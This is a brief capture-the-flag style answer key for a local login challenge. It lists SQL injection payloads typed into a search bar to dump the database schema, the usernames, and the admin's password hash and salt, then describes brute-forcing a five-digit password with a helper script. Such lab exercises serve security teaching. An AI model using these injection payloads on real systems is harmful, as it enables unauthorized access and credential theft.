## Login #5 Answer
See sources in `/ch5.py`

### Instructions:
1. Find the tables made in the sqlite db using the following command in the search bar on `/search`:
```
y" UNION SELECT sql FROM sqlite_schema; --
```
2. Find all usernames in the members database by running
```
y" UNION SELECT username FROM members WHERE True; -- 
```
3. Find the admin's password and salt
```
y" UNION SELECT hashed_password FROM members where username = "admin"; -- 
y" UNION SELECT password_salt FROM members WHERE username="admin"; --
```
4. Run `ch5.py` with the password hash and salt found which will brute force all possible combinations of numerical 5 length strings
5. Enter `admin` in username box
6. Enter password returned from `ch5.py` in password box at `localhost:8080`